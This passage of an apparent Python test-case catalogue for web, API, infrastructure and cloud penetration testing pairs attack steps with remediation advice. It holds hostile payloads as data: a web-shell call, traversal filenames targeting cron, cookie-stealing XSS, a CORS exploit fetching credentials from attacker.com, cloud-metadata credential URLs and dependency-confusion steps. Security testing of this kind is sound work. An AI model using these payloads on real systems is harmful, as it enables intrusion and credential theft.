            "Locate uploaded file via directory enumeration and execute: /uploads/shell.php?cmd=id",
        ],
        "expected_result": "Upload must validate magic bytes AND extension AND use randomized filenames in non-executable dirs.",
        "cwe": "CWE-434", "owasp": "A04:2021",
        "tools": {"nuclei_tags": ["upload"]},
        "applicable_to": ["web"], "tags": ["upload", "rce", "critical"],
    },
    {
        "id": "TC-FU002", "title": "Path Traversal via Upload Filename",
        "category": "File Upload", "severity": "high",
        "description": "Filenames with traversal sequences can overwrite server files outside the upload directory.",
        "attack_pattern": "Inject path traversal into filename field of multipart upload.",
        "steps": [
            "Upload file with filename: ../../../../etc/cron.d/backdoor",
            "Test: ../../../var/www/html/shell.php",
            "URL-encoded: ..%2F..%2F..%2Fetc%2Fpasswd",
            "Test in Content-Disposition header within multipart body",
            "Verify if server writes file to the traversed path",
        ],
        "expected_result": "Filenames must be sanitized and stripped of path separators. Use server-generated names.",
        "cwe": "CWE-22", "owasp": "A01:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["upload", "path-traversal"],
    },
    {
        "id": "TC-FU003", "title": "SVG / XML Upload XSS",
        "category": "File Upload", "severity": "high",
        "description": "SVG files are XML that executes JavaScript when rendered in a browser. Uploading SVG enables XSS.",
        "attack_pattern": "Upload an SVG containing script tags or event handlers.",
        "steps": [
            "Create SVG: <svg xmlns='http://www.w3.org/2000/svg'><script>alert(document.cookie)</script></svg>",
            "Upload as profile picture or document",
            "If served with Content-Type: image/svg+xml — XSS fires when accessed",
            "Test even if .svg is blocked — try: file.svg%00.png, file.svgz",
            "Test XML files with the same payload via doctype XXE",
        ],
        "expected_result": "SVG files must be sanitized or served with Content-Disposition: attachment.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["upload", "xss", "svg"],
    },
    {
        "id": "TC-FU004", "title": "Zip Slip via Archive Upload",
        "category": "File Upload", "severity": "high",
        "description": "Archives containing path traversal filenames extract files outside the intended directory.",
        "attack_pattern": "Create a zip with files named with traversal paths and upload it.",
        "steps": [
            "Create malicious zip: evilenough.zip containing ../../shell.jsp",
            "Use: zip-slip tool or Python: zipfile.ZipFile, add file with path '../../etc/cron.d/backdoor'",
            "Upload to any feature that extracts archives (import, restore, plugin upload)",
            "Verify if files are extracted outside the target directory",
        ],
        "expected_result": "Zip extraction must validate all entry paths against the target directory before writing.",
        "cwe": "CWE-22", "owasp": "A01:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["upload", "zipslip", "path-traversal"],
    },

    # ── BUSINESS LOGIC ────────────────────────────────────────────────────────
    {
        "id": "TC-BL001", "title": "Race Condition / TOCTOU",
        "category": "Business Logic", "severity": "high",
        "description": "Concurrent requests can bypass single-use restrictions, double-spend credits, or apply promo codes multiple times.",
        "attack_pattern": "Send multiple identical requests simultaneously to exploit check-then-act gaps.",
        "steps": [
            "Identify single-use operations: coupon codes, referral bonuses, gift card redemption",
            "Send 50 simultaneous requests using Burp Turbo Intruder or asyncio",
            "Check if operation succeeded more than once (credit applied multiple times, coupon reused)",
            "Test account creation race: register same email simultaneously — can two accounts be created?",
            "Test balance transfer: subtract and add simultaneously to get extra balance",
        ],
        "expected_result": "All single-use operations must use database-level locks or atomic transactions.",
        "cwe": "CWE-367", "owasp": "A04:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["race-condition", "logic", "business-logic"],
    },
    {
        "id": "TC-BL002", "title": "Price / Parameter Manipulation",
        "category": "Business Logic", "severity": "high",
        "description": "Client-side price parameters sent during checkout can be modified to purchase items for $0 or negative amounts.",
        "attack_pattern": "Intercept and modify price, quantity, and discount parameters in purchase flows.",
        "steps": [
            "Intercept checkout request — look for price, amount, total in request body",
            "Modify price to 0 or negative value: {\"price\": 0.01} or {\"amount\": -100}",
            "Test quantity: negative quantity + apply discount = negative total (credit)",
            "Test integer overflow: quantity=99999999 * price — check for integer overflow",
            "Test discount beyond 100%: coupon=100OFF",
        ],
        "expected_result": "Prices and totals must always be calculated server-side from the product catalog.",
        "cwe": "CWE-20", "owasp": "A04:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["logic", "payment", "business-logic"],
    },
    {
        "id": "TC-BL003", "title": "Workflow Bypass",
        "category": "Business Logic", "severity": "medium",
        "description": "Multi-step processes (checkout, registration, verification) can often be bypassed by skipping steps.",
        "attack_pattern": "Navigate directly to later steps in a multi-step flow, skipping required steps.",
        "steps": [
            "Map the complete workflow (step 1 → 2 → 3 → confirmation)",
            "After completing step 1, jump directly to step 3 URL",
            "Submit step 3 parameters without completing step 2",
            "Test email verification bypass: navigate directly to authenticated area before verifying",
            "Test payment bypass: jump from cart directly to order confirmation endpoint",
        ],
        "expected_result": "Server must validate all previous steps are completed before processing the next.",
        "cwe": "CWE-284", "owasp": "A04:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["logic", "workflow", "bypass"],
    },
    {
        "id": "TC-BL004", "title": "Account Takeover via Logic Flaws",
        "category": "Business Logic", "severity": "critical",
        "description": "Common ATO patterns from bug bounty reports: password reset token reuse, self-XSS chain, OAuth linking, and IDOR on account settings.",
        "attack_pattern": "Chain logic flaws to hijack another user's account.",
        "steps": [
            "Test password reset token reuse: use same token twice",
            "Test token validity: modify email in reset link, does original token work for new address?",
            "OAuth account linking: can attacker-controlled OAuth account be linked to victim account?",
            "IDOR on email change: change email of user ID other than self",
            "Test: change password without knowing old password via API (skip old_password field)",
        ],
        "expected_result": "Single-use tokens. Server-side email ownership verification. No IDOR on account settings.",
        "cwe": "CWE-640", "owasp": "A07:2021",
        "tools": {}, "applicable_to": ["web", "api"], "tags": ["ato", "account-takeover", "critical"],
    },

    # ── CLIENT-SIDE ───────────────────────────────────────────────────────────
    {
        "id": "TC-CS001", "title": "DOM-Based XSS",
        "category": "Client-Side", "severity": "high",
        "description": "JavaScript reads from dangerous sources (location.hash, document.referrer) and writes to sinks (innerHTML, eval) without sanitization.",
        "attack_pattern": "Inject payloads into DOM sources that flow to sinks without server involvement.",
        "steps": [
            "Identify DOM sources: location.hash, location.search, document.referrer, localStorage",
            "Identify DOM sinks: innerHTML, document.write, eval, setTimeout, location.href",
            "Test: https://target.com/page#<img src=x onerror=alert(1)>",
            "Test: https://target.com/page?q=<svg onload=alert(1)>",
            "Use DOM Invader (Burp) to automatically trace sources to sinks",
        ],
        "expected_result": "Use textContent instead of innerHTML. Sanitize all DOM writes. Implement CSP.",
        "cwe": "CWE-79", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["xss", "dom"]},
        "applicable_to": ["web"], "tags": ["xss", "dom", "client-side"],
    },
    {
        "id": "TC-CS002", "title": "Clickjacking",
        "category": "Client-Side", "severity": "medium",
        "description": "Pages loaded in iframes allow click-hijacking attacks that trick users into unintended actions.",
        "attack_pattern": "Embed target in an iframe and overlay invisible buttons.",
        "steps": [
            "Create test HTML: <iframe src='https://target.com/account/delete' style='opacity:0.5'></iframe>",
            "Check if the page loads inside the iframe (no X-Frame-Options or CSP frame-ancestors)",
            "Test all sensitive pages: account settings, password change, delete account, transfer funds",
            "Craft PoC overlay with decoy UI aligned to critical buttons",
        ],
        "expected_result": "All pages must set X-Frame-Options: DENY or CSP frame-ancestors 'none'.",
        "cwe": "CWE-1021", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["clickjacking", "headers"]},
        "applicable_to": ["web"], "tags": ["clickjacking", "client-side"],
    },
    {
        "id": "TC-CS003", "title": "CORS Misconfiguration",
        "category": "Client-Side", "severity": "high",
        "description": "Overly permissive CORS allows attacker-controlled sites to make credentialed cross-origin requests.",
        "attack_pattern": "Test CORS headers with various Origin values and check for credentialed access.",
        "steps": [
            "Send request with: Origin: https://attacker.com — check for Access-Control-Allow-Origin: https://attacker.com",
            "Test null origin: Origin: null — some configs reflect null allowing file:// sandboxed iframes",
            "Test subdomain: Origin: https://evil.target.com — check if reflected",
            "Test with credentials: ensure Access-Control-Allow-Credentials: true requires explicit origin (not *)",
            "Exploit: craft page on attacker.com that fetches /api/user/profile with credentials",
        ],
        "expected_result": "CORS must use explicit allowlist. Never reflect arbitrary Origin. Credentials require exact origins.",
        "cwe": "CWE-942", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["cors", "misconfig"]},
        "applicable_to": ["web", "api"], "tags": ["cors", "client-side"],
    },
    {
        "id": "TC-CS004", "title": "WebSocket Security",
        "category": "Client-Side", "severity": "medium",
        "description": "WebSockets bypass many security controls — no same-origin policy, no CSRF tokens by default, messages not validated server-side.",
        "attack_pattern": "Intercept and manipulate WebSocket messages and test for origin validation.",
        "steps": [
            "Intercept WebSocket handshake — check if Origin header is validated",
            "Connect from a different origin: new WebSocket('wss://target.com/ws') from attacker domain",
            "Intercept and manipulate messages in Burp — inject malicious commands",
            "Test for XSS via WebSocket: send payload as message and check if reflected in DOM",
            "Test authentication: does WS connection remain active after token expiry/logout?",
        ],
        "expected_result": "WebSocket server must validate Origin header and authenticate connections.",
        "cwe": "CWE-345", "owasp": "A05:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["websocket", "client-side"],
    },
    {
        "id": "TC-CS005", "title": "Web Cache Poisoning",
        "category": "Client-Side", "severity": "high",
        "description": "Injecting malicious content into a cached response causes it to be served to all subsequent users requesting the same URL.",
        "attack_pattern": "Use unkeyed inputs (headers, parameters) to poison the cache with malicious responses.",
        "steps": [
            "Identify caching layer (CDN, Varnish, nginx cache) via Age, X-Cache, CF-Cache-Status headers",
            "Find unkeyed inputs: X-Forwarded-Host, X-Original-URL, X-Rewrite-URL headers",
            "Test: add X-Forwarded-Host: attacker.com — if reflected in response, cache it",
            "Poison: inject XSS payload in a header that's reflected in script src or link href",
            "Verify: request without the poisoning header — check if cached malicious response is returned",
        ],
        "expected_result": "Cache keys must include all inputs that affect the response. Unkeyed inputs must be stripped.",
        "cwe": "CWE-444", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["cache"]},
        "applicable_to": ["web"], "tags": ["cache-poisoning", "advanced"],
    },
    {
        "id": "TC-CS006", "title": "Prototype Pollution",
        "category": "Client-Side", "severity": "high",
        "description": "JavaScript prototype chain manipulation allows injecting properties into all objects, enabling XSS and logic bypass.",
        "attack_pattern": "Inject __proto__ or constructor.prototype via URL params, JSON, or DOM-based sources.",
        "steps": [
            "Test URL: https://target.com/?__proto__[test]=injected — check if window.test === 'injected'",
            "Test JSON body: {\"__proto__\": {\"isAdmin\": true}}",
            "Test nested: {\"constructor\": {\"prototype\": {\"isAdmin\": true}}}",
            "Look for sinks: lodash.merge(), _.defaultsDeep(), Object.assign() with user input",
            "Escalate to XSS: pollute a property used in innerHTML: {\"__proto__\": {\"innerHTML\": \"<img onerror=alert(1)>\"}}",
        ],
        "expected_result": "Use Object.create(null) for untrusted data. Validate object keys. Use safe merge functions.",
        "cwe": "CWE-1321", "owasp": "A03:2021",
        "tools": {"nuclei_tags": ["prototype-pollution"]},
        "applicable_to": ["web"], "tags": ["prototype-pollution", "javascript", "advanced"],
    },

    # ── API SECURITY ──────────────────────────────────────────────────────────
    {
        "id": "TC-API001", "title": "Broken Object Level Authorization (BOLA)",
        "category": "API Security", "severity": "critical",
        "description": "APIs using object IDs without ownership verification allow any user to access any object.",
        "attack_pattern": "Replace object IDs with IDs belonging to other users/orgs.",
        "steps": [
            "Map all API endpoints using object IDs: GET /api/users/{id}, GET /api/orders/{id}",
            "With account B's token, request account A's resources by ID",
            "Test all HTTP methods: GET, PUT, PATCH, DELETE on cross-user resources",
            "Test horizontal (same role) and vertical (cross-role) privilege escalation",
        ],
        "expected_result": "Every object access must verify requesting user owns or has permission.",
        "cwe": "CWE-639", "owasp": "A01:2021",
        "tools": {}, "applicable_to": ["api"], "tags": ["bola", "idor", "api"],
    },
    {
        "id": "TC-API002", "title": "API Rate Limiting Bypass",
        "category": "API Security", "severity": "medium",
        "description": "APIs without effective rate limiting are vulnerable to brute-force. Rate limits are often bypassable.",
        "attack_pattern": "Probe for thresholds then attempt bypass techniques.",
        "steps": [
            "Identify rate-limited endpoints (login, OTP, expensive queries)",
            "Test IP bypass: X-Forwarded-For, X-Real-IP, CF-Connecting-IP with different values",
            "Test path variation: /api/login vs /api/Login vs /api/login/",
            "Test account-level bypass: multiple API keys for the same action",
        ],
        "expected_result": "Rate limits enforced server-side regardless of IP headers.",
        "cwe": "CWE-770", "owasp": "A04:2021",
        "tools": {"nuclei_tags": ["rate-limit"]},
        "applicable_to": ["api", "web"], "tags": ["rate-limit", "brute-force"],
    },
    {
        "id": "TC-API003", "title": "GraphQL Introspection & Batching",
        "category": "API Security", "severity": "medium",
        "description": "Enabled introspection exposes full schema. Batching allows abuse of rate limits and brute-force.",
        "attack_pattern": "Send introspection query and batch mutation requests.",
        "steps": [
            "Send: {__schema{types{name,fields{name}}}} — check if schema returned",
            "Use graphql-voyager to visualize schema and find sensitive mutations",
            "Test batching: send array of 100 login mutations in single request",
            "Look for deleteUser, updateRole, createAdmin, disableMFA mutations",
            "Test field-level authorization: request admin-only fields as regular user",
        ],
        "expected_result": "Introspection disabled in production. Batching rate-limited. Field-level auth enforced.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["graphql", "exposure"]},
        "applicable_to": ["api"], "tags": ["graphql", "api"],
    },
    {
        "id": "TC-API004", "title": "Mass Assignment",
        "category": "API Security", "severity": "high",
        "description": "APIs binding request body to models allow setting privileged fields (role, isAdmin) not meant for user input.",
        "attack_pattern": "Include undocumented privileged fields in API request bodies.",
        "steps": [
            "Discover model fields from API responses, docs, or JavaScript source",
            "Add to update requests: {\"role\": \"admin\", \"is_verified\": true, \"balance\": 9999}",
            "Test registration: {\"email\": \"x\", \"password\": \"y\", \"is_admin\": true}",
            "Test all PUT/PATCH endpoints for unfiltered binding",
        ],
        "expected_result": "Use explicit allow-lists (DTOs/serializers). Never bind raw request data to models.",
        "cwe": "CWE-915", "owasp": "A03:2021",
        "tools": {}, "applicable_to": ["api"], "tags": ["mass-assignment", "api"],
    },
    {
        "id": "TC-API005", "title": "Excessive Data Exposure",
        "category": "API Security", "severity": "medium",
        "description": "APIs returning full object data and relying on client-side filtering expose sensitive fields.",
        "attack_pattern": "Inspect all API responses for fields not displayed in the UI.",
        "steps": [
            "Compare raw API response with what the UI actually displays",
            "Look for hidden fields: password_hash, ssn, credit_card, internal_notes, admin_flag",
            "Test user list endpoint: does it return all users' private details?",
            "Test search endpoint: does partial match return more data than needed?",
            "Intercept mobile app traffic — mobile APIs often expose more than web APIs",
        ],
        "expected_result": "API responses must only include fields necessary for the client's function.",
        "cwe": "CWE-200", "owasp": "A03:2021",
        "tools": {}, "applicable_to": ["api"], "tags": ["api", "data-exposure"],
    },
    {
        "id": "TC-API006", "title": "Broken Function Level Authorization",
        "category": "API Security", "severity": "high",
        "description": "Admin functions accessible to regular users by guessing or manipulating endpoint paths.",
        "attack_pattern": "Test admin/privileged API endpoints while authenticated as a regular user.",
        "steps": [
            "Identify admin endpoints from JS source, docs, or swagger: /api/admin/*, /api/v1/admin/*",
            "Access admin endpoints with regular user token",
            "Test HTTP method switching: GET /api/users works, try DELETE /api/users/all",
            "Test API version switching: v2 admin endpoints accessible from v1 paths",
            "Test undocumented endpoints: /api/internal/*, /api/debug/*",
        ],
        "expected_result": "All privileged functions must verify user role before execution.",
        "cwe": "CWE-285", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "api"]},
        "applicable_to": ["api"], "tags": ["authorization", "api", "privilege-escalation"],
    },

    # ── INFRASTRUCTURE ────────────────────────────────────────────────────────
    {
        "id": "TC-N001", "title": "SSL/TLS Misconfiguration",
        "category": "Infrastructure", "severity": "medium",
        "description": "Weak TLS configurations allow downgrade attacks. Expired certificates indicate poor lifecycle management.",
        "attack_pattern": "Probe TLS configuration with specialized scanners.",
        "steps": [
            "Run: testssl.sh <target> or sslyze --regular <target>",
            "Check for SSLv2, SSLv3, TLS 1.0, TLS 1.1 (must be disabled)",
            "Check for RC4, DES, 3DES, EXPORT, NULL ciphers",
            "Verify certificate: expiry, CN match, trusted CA, 2048-bit+ key",
            "Check HSTS: Strict-Transport-Security: max-age=31536000; includeSubDomains",
        ],
        "expected_result": "TLS 1.2+ only. Strong ciphers. Valid certificate chain. HSTS preloaded.",
        "cwe": "CWE-326", "owasp": "A02:2021",
        "tools": {"nmap": ["--script ssl-enum-ciphers", "-p 443"], "nuclei_tags": ["ssl", "tls"]},
        "applicable_to": ["web", "network", "api"], "tags": ["tls", "ssl", "certificate"],
    },
    {
        "id": "TC-N002", "title": "Exposed Admin Panels",
        "category": "Infrastructure", "severity": "high",
        "description": "Internet-accessible admin panels without IP restriction increase attack surface significantly.",
        "attack_pattern": "Enumerate common admin paths across all discovered hosts.",
        "steps": [
            "Fuzz: /admin, /administrator, /wp-admin, /phpmyadmin, /manager, /console",
            "Test: /jenkins, /grafana, /kibana, /portainer, /traefik, /rabbitmq",
            "Check all subdomains: admin.target.com, manage.target.com, dashboard.target.com",
            "Verify accessibility without IP restriction",
            "Test default credentials on all discovered panels",
        ],
        "expected_result": "Admin panels IP-restricted to management networks or VPN-only.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["panel", "exposure", "login"], "ffuf_wordlist": "common.txt"},
        "applicable_to": ["web", "network"], "tags": ["admin-panel", "exposure"],
    },
    {
        "id": "TC-N003", "title": "Exposed Metrics & Debug Endpoints",
        "category": "Infrastructure", "severity": "high",
        "description": "Prometheus /metrics, Spring Actuator, /debug, /pprof expose internal app data and sometimes allow code execution.",
        "attack_pattern": "Request common metrics and debug paths without authentication.",
        "steps": [
            "Test: /metrics, /actuator, /actuator/env, /actuator/heapdump, /actuator/shutdown",
            "Test: /debug/pprof, /debug/vars, /__debug/",
            "Test: /swagger.json, /openapi.json, /api-docs, /v2/api-docs",
            "Spring Actuator /actuator/env may expose plaintext passwords",
            "/actuator/shutdown can kill the application",
        ],
        "expected_result": "All debug/metrics endpoints must be disabled or restricted to internal networks.",
        "cwe": "CWE-200", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "misconfig", "spring"]},
        "applicable_to": ["web", "network"], "tags": ["debug", "metrics", "exposure"],
    },
    {
        "id": "TC-N004", "title": "Unencrypted Service Exposure",
        "category": "Infrastructure", "severity": "high",
        "description": "Plaintext protocols (Telnet, FTP, HTTP) transmit credentials in cleartext.",
        "attack_pattern": "Port scan for plaintext services and verify accessibility.",
        "steps": [
            "Scan: nmap -sV -p 21,23,25,80,110,143 <target>",
            "Test anonymous FTP: ftp <target>, user: anonymous",
            "Test Telnet: telnet <target> 23",
            "Check HTTP → HTTPS redirect on port 80",
        ],
        "expected_result": "All plaintext services disabled or replaced with encrypted equivalents.",
        "cwe": "CWE-319", "owasp": "A02:2021",
        "tools": {"nmap": ["-sV", "-p 21,23,25,80,110,143"]},
        "applicable_to": ["network"], "tags": ["plaintext", "ftp", "telnet"],
    },
    {
        "id": "TC-N005", "title": "Backup & Config File Discovery",
        "category": "Infrastructure", "severity": "high",
        "description": "Backup files (.bak, .old, ~) accessible in web root expose source code and configuration.",
        "attack_pattern": "Fuzz for backup extensions across known application paths.",
        "steps": [
            "For each endpoint /index.php: test /index.php.bak, /index.php.old, /index.php~",
            "Test: /backup.zip, /site.tar.gz, /db.sql.gz",
            "Test config backups: /config.php.bak, /web.config.bak, /.htaccess.bak",
            "Use ffuf -w backup-ext-list.txt against all discovered paths",
        ],
        "expected_result": "Backup files must not be in web-accessible directories.",
        "cwe": "CWE-530", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "backup"]},
        "applicable_to": ["web"], "tags": ["backup", "exposure"],
    },
    {
        "id": "TC-N006", "title": "Database Port Directly Exposed",
        "category": "Infrastructure", "severity": "critical",
        "description": "Databases listening on public IPs allow direct exploitation, credential brute-force, and data extraction.",
        "attack_pattern": "Port scan for common database ports on all discovered IPs.",
        "steps": [
            "nmap -sV -p 3306,5432,27017,6379,9200,5984,8086,1521 <all_ips>",
            "MySQL: mysql -u root -h <ip> (no password)",
            "MongoDB: mongo --host <ip> (no auth) — db.getCollectionNames()",
            "Redis: redis-cli -h <ip> INFO server",
            "Elasticsearch: curl http://<ip>:9200/_cat/indices",
        ],
        "expected_result": "Database ports must be firewalled. Never exposed to internet.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nmap": ["-sV", "-p 3306,5432,27017,6379,9200"], "nuclei_tags": ["database", "exposure"]},
        "applicable_to": ["network", "cloud"], "tags": ["database", "exposure", "critical"],
    },
    {
        "id": "TC-N007", "title": "Kubernetes Dashboard Exposure",
        "category": "Infrastructure", "severity": "critical",
        "description": "Publicly accessible Kubernetes dashboards allow full cluster takeover.",
        "attack_pattern": "Scan for Kubernetes dashboard and API server on common ports.",
        "steps": [
            "Scan: nmap -p 8001,8443,6443,10250,10255,2379 <target_range>",
            "Test K8s API: curl https://<ip>:6443/api/v1/pods --insecure",
            "Test dashboard: https://<ip>:8001/api/v1/namespaces/kubernetes-dashboard/services",
            "Test kubelet: curl http://<ip>:10255/pods (unauthenticated read)",
            "Test etcd: curl http://<ip>:2379/v2/keys/?recursive=true",
        ],
        "expected_result": "K8s API and dashboard must require authentication. etcd encrypted at rest and in transit.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["kubernetes", "exposure"]},
        "applicable_to": ["network", "cloud"], "tags": ["kubernetes", "cloud", "critical"],
    },
    {
        "id": "TC-N008", "title": "HTTP Methods (TRACE/PUT/DELETE)",
        "category": "Infrastructure", "severity": "medium",
        "description": "Dangerous HTTP methods like TRACE (XST), PUT (file write), and DELETE expose significant risk.",
        "attack_pattern": "Test all HTTP methods on all discovered endpoints.",
        "steps": [
            "OPTIONS request to identify allowed methods",
            "TRACE request — if 200 with request echoed back: Cross-Site Tracing (XST) possible",
            "PUT /test.txt with body — if successful: arbitrary file write",
            "DELETE /important-file — test for unauthenticated file deletion",
            "Test method override: X-HTTP-Method-Override: DELETE on POST requests",
        ],
        "expected_result": "Only GET/POST/PUT/PATCH/DELETE required by the app should be allowed. TRACE disabled.",
        "cwe": "CWE-650", "owasp": "A05:2021",
        "tools": {"nmap": ["--script http-methods", "-p 80,443"]},
        "applicable_to": ["web", "network"], "tags": ["http-methods", "configuration"],
    },

    # ── CLOUD SECURITY ────────────────────────────────────────────────────────
    {
        "id": "TC-C001", "title": "S3 Bucket Public Access",
        "category": "Cloud Security", "severity": "critical",
        "description": "Misconfigured S3 buckets expose sensitive data or allow hosting malicious content.",
        "attack_pattern": "Enumerate probable bucket names and test for public list and object access.",
        "steps": [
            "Enumerate: <target>, <target>-prod, <target>-backup, <target>-dev, <target>-static",
            "List: aws s3 ls s3://<bucket> --no-sign-request",
            "Read: aws s3 cp s3://<bucket>/config.json . --no-sign-request",
            "Write: aws s3 cp test.txt s3://<bucket>/ --no-sign-request",
            "Check for: .env, credentials, database dumps, PII",
        ],
        "expected_result": "Block Public Access enabled. Least-privilege bucket policies.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["s3", "cloud", "exposure"]},
        "applicable_to": ["cloud"], "tags": ["s3", "aws", "data-exposure", "critical"],
    },
    {
        "id": "TC-C002", "title": "Cloud Metadata SSRF (IMDS)",
        "category": "Cloud Security", "severity": "critical",
        "description": "IMDS access via SSRF yields temporary IAM credentials granting cloud account access.",
        "attack_pattern": "Exploit SSRF to reach the IMDS endpoint.",
        "steps": [
            "Find SSRF vector (see TC-W004)",
            "AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>",
            "GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "Azure: http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
            "Use extracted credentials: aws sts get-caller-identity --access-key <key>",
        ],
        "expected_result": "IMDSv2 (token-required) enforced. SSRF protection blocks RFC 1918.",
        "cwe": "CWE-918", "owasp": "A10:2021",
        "tools": {"nuclei_tags": ["ssrf", "cloud", "aws"]},
        "applicable_to": ["cloud", "web"], "tags": ["ssrf", "imds", "aws", "critical"],
    },
    {
        "id": "TC-C003", "title": "Azure Blob / GCS Public Storage",
        "category": "Cloud Security", "severity": "high",
        "description": "Public Azure Blob containers and GCS buckets expose sensitive data without authentication.",
        "attack_pattern": "Enumerate storage account names and test for public access.",
        "steps": [
            "Azure: https://<account>.blob.core.windows.net/<container>?restype=container&comp=list",
            "GCS: https://storage.googleapis.com/<bucket>/",
            "Try: <company>-prod, <company>backup, <company>static",
            "Check for sensitive files in accessible buckets",
        ],
        "expected_result": "All cloud storage uses private access. Public access explicitly justified.",
        "cwe": "CWE-284", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["cloud", "azure", "gcs"]},
        "applicable_to": ["cloud"], "tags": ["cloud", "azure", "gcs", "storage"],
    },
    {
        "id": "TC-C004", "title": "IAM Privilege Escalation",
        "category": "Cloud Security", "severity": "critical",
        "description": "Overly permissive IAM policies allow attackers with limited access to escalate to admin.",
        "attack_pattern": "Enumerate IAM permissions and identify escalation paths.",
        "steps": [
            "Enumerate current permissions: aws iam get-user, aws iam list-attached-user-policies",
            "Check for iam:CreatePolicyVersion, iam:SetDefaultPolicyVersion, iam:AttachUserPolicy",
            "Check for sts:AssumeRole with overly permissive trust policy",
            "Test lambda:UpdateFunctionCode / PassRole to escalate via Lambda",
            "Use Pacu or Cloudsploit for automated IAM privilege escalation enumeration",
        ],
        "expected_result": "Least privilege IAM policies. No wildcard * permissions. SCPs enforced.",
        "cwe": "CWE-269", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["cloud", "iam"]},
        "applicable_to": ["cloud"], "tags": ["iam", "privilege-escalation", "aws", "critical"],
    },

    # ── INFORMATION DISCLOSURE ────────────────────────────────────────────────
    {
        "id": "TC-I001", "title": "Verbose Error Messages",
        "category": "Information Disclosure", "severity": "low",
        "description": "Stack traces and debug pages expose internal paths, library versions, and DB schema.",
        "attack_pattern": "Trigger errors with malformed input and inspect response for verbose details.",
        "steps": [
            "Submit unexpected types: strings for numeric fields, very long inputs, null bytes",
            "Request non-existent resources: /test.aspx, /test.php, /test.jsp",
            "Trigger DB errors with single quote in all params",
            "Submit malformed JSON/XML to API endpoints",
            "Check for Django DEBUG=True, PHP error_reporting, Rails exception page",
        ],
        "expected_result": "Generic error messages only in production. No stack traces to client.",
        "cwe": "CWE-209", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["exposure", "error-page"]},
        "applicable_to": ["web", "api"], "tags": ["information-disclosure"],
    },
    {
        "id": "TC-I002", "title": "Security Header Audit",
        "category": "Information Disclosure", "severity": "medium",
        "description": "Missing security headers leave browsers vulnerable to clickjacking, MIME sniffing, and XSS.",
        "attack_pattern": "Inspect HTTP response headers against security checklist.",
        "steps": [
            "Check Content-Security-Policy — controls script/style/image sources",
            "Check X-Frame-Options: DENY or CSP frame-ancestors — clickjacking protection",
            "Check X-Content-Type-Options: nosniff — prevents MIME sniffing",
            "Check Strict-Transport-Security with adequate max-age",
            "Check Server and X-Powered-By — strip version info",
        ],
        "expected_result": "All security headers present. Server/X-Powered-By stripped or generic.",
        "cwe": "CWE-693", "owasp": "A05:2021",
        "tools": {"nuclei_tags": ["headers", "misconfig"]},
        "applicable_to": ["web", "api"], "tags": ["headers", "configuration"],
    },
    {
        "id": "TC-I003", "title": "API Version & Swagger Exposure",
        "category": "Information Disclosure", "severity": "info",
        "description": "Undocumented/deprecated API versions and exposed Swagger docs reveal the full attack surface.",
        "attack_pattern": "Enumerate API versions and find exposed documentation endpoints.",
        "steps": [
            "Test: /api/v1/, /api/v2/, /api/v3/, /api/beta/, /api/internal/",
            "Test docs: /swagger.json, /openapi.json, /api-docs, /v2/api-docs, /swagger-ui.html",
            "Compare v1 vs v2 — older versions often have fewer security controls",
            "Extract endpoints from JS source: grep for 'fetch\\|axios\\|API_URL' in bundles",
        ],
        "expected_result": "Deprecated API versions decommissioned. Internal APIs require authentication.",
        "cwe": "CWE-200", "owasp": "A01:2021",
        "tools": {"nuclei_tags": ["exposure", "api", "swagger"]},
        "applicable_to": ["api", "web"], "tags": ["api", "enumeration"],
    },

    # ── MODERN WEB ATTACKS (from bug bounty patterns) ─────────────────────────
    {
        "id": "TC-MW001", "title": "Web Cache Deception",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "Cache servers cache authenticated responses for static-looking paths, exposing victim data to attackers.",
        "attack_pattern": "Craft URLs that trick the cache into storing authenticated responses.",
        "steps": [
            "Identify authenticated endpoints returning personal data: /account, /profile",
            "Append fake static suffix: /account/nonexistent.css, /profile/fake.jpg",
            "If cached (via Age or X-Cache headers), visit URL as unauthenticated user",
            "Check if cached authenticated response is returned to unauthenticated attacker",
            "Test variations: /account;.css, /account/.css, /account%2F..%2Fstatic.css",
        ],
        "expected_result": "Cache must not store authenticated responses. Use Cache-Control: no-store on user-specific endpoints.",
        "cwe": "CWE-525", "owasp": "A05:2021",
        "tools": {}, "applicable_to": ["web"], "tags": ["cache-deception", "advanced"],
    },
    {
        "id": "TC-MW002", "title": "Dependency Confusion Attack",
        "category": "Modern Web Attacks", "severity": "high",
        "description": "Private package names published to public registries (npm, PyPI) get installed instead of internal versions.",
        "attack_pattern": "Identify internal package names and publish higher-versioned packages to public registries.",
        "steps": [
            "Find internal package names: package.json, requirements.txt, .npmrc files in public repos",
            "Check if internal package names exist on npm/PyPI/PyPI: npm info <internal-pkg>",
            "Publish to public registry with higher version than internal — 9.9.9",
            "Internal CI/CD systems will install public version — add callback for detection",
            "Monitor for HTTP callbacks from victim infrastructure in DNS logs",
        ],
        "expected_result": "Use scoped packages. Configure package managers to use internal registry exclusively.",
        "cwe": "CWE-829", "owasp": "A08:2021",
